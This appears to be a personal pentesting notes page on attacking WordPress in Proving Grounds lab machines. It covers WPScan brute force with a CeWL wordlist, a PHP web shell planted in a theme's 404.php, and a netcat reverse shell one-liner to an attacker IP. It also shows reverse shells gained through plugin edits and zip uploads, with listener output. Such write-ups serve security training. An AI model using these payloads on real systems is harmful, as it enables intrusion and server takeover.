---
layout: default
title: Wordpress
parent: Web Exploits
nav_order: 5
---

# Wordpress

---

## Brute Force via WPScan

Use Cewl to get a custom wordlist of the site

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ cewl http://dc-2 -m 5 -w cewl.txt 2>/dev/null


```

WPScan password attack with the enumerated users and _cewl_ password list.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ wpscan --url http://dc-2 --disable-tls-checks -U users.txt -P cewl.txt

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

```

We have valid login credentials for _jerry_ and _tom_
jerry:adipiscing
tom:parurient
{: .warn }

We can SSH to port 7744 as _tom_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ ssh tom@192.168.160.194 -p 7744
tom@192.168.160.194's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$
```

## Exploit TwentyFourteen Wordpress Theme

Place the following in the \*404.php\_ file.

```bash
<?php echo system($_REQUEST["cmd"]); ?>
```

![404](../../../../assets/images/ctfs/proving_grounds/btrsys/404.png)

Verify that the PHP web shell is executing commands.

![cmd](../../../../assets/images/ctfs/proving_grounds/btrsys/cmd.png)

Use _revshellgen_ to execute a reverse shell one-liner via the PHP web shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Execute the URL encoded payload in the PHP web shell and receive a reverse shell in our netcat listener.

```bash
URL: http://192.168.242.50/wordpress/wp-content/themes/twentyfourteen/404.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.242.50] 51742
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Exploit Hello Dolly Plugin

Attempting Hello Dolly plugin edit exploit.

![dolly1](../../../../assets/images/ctfs/proving_grounds/funbox/dolly1.png)

Add the PHP reverse shell script and edit.

![dolly2](../../../../assets/images/ctfs/proving_grounds/funbox/dolly2.png)

Activate the Hello Dolly plugin and get a reverse shell.

![dolly3](../../../../assets/images/ctfs/proving_grounds/funbox/dolly3.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funbox]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.218.77] 49092
Linux funbox 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 03:14:29 up 28 min,  0 users,  load average: 0.00, 0.05, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Exploit AdRotate Plugin

The _AdRotate_ plugin allows file upload in zip format

![banner](../../../../assets/images/ctfs/proving_grounds/loly/banner.png)

Edit php-reverse-shell.php and zip as _rev.php_ within _zip.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ zip rev.zip  rev.php
  adding: rev.php (deflated 59%)

```

Upload rev.zip

![upload](../../../../assets/images/ctfs/proving_grounds/loly/upload.png)

Trigger by navigating to _/wordpress/wp-content/banners/rev.php_

![trigger](../../../../assets/images/ctfs/proving_grounds/loly/trigger.png)

Receive the reverse shell in our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.242.121] 60228
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 18:34:05 up  1:45,  0 users,  load average: 0.02, 0.05, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
